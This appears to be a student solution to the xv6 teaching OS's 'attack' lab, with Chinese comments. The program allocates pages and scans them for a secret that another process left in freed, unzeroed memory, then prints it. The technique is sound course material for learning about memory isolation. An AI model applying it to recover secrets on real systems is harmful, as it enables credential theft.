#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"
#include "kernel/param.h"

int
main(int argc, char *argv[])
{
  if(argc != 1){
    printf("Usage: attack \n");
    exit(1);
  }
  // 需要了解页表的分配机制。freelist是一个栈，secret如果是刚刚运行的程序，attack会申请到它释放的页表。
  char *start = sbrk(PGSIZE * 32);
  char *end = start + PGSIZE * 32;
  char *ptr;
  char *signature = "my very very very secret pw is:   ";

  // 遍历内存区域查找Secret Signature.
  for (ptr = start; ptr < end; ptr += PGSIZE) {
    if (memcmp(signature + 8, ptr + 8, 32 - 8) == 0) {
      // free() 会覆盖页表前8个字符用于存放指针，所以 'my very ' 这8个字符会被覆盖掉。
      printf("Secret found at: %p\n", ptr + 32);
      printf("Secret: %s\n", ptr + 32);
      write(2, ptr + 32, 8);
      break;
    }
  }
  if (ptr >= end) {
    printf("Secret not found.");
    exit(1);
  }
  exit(0);
}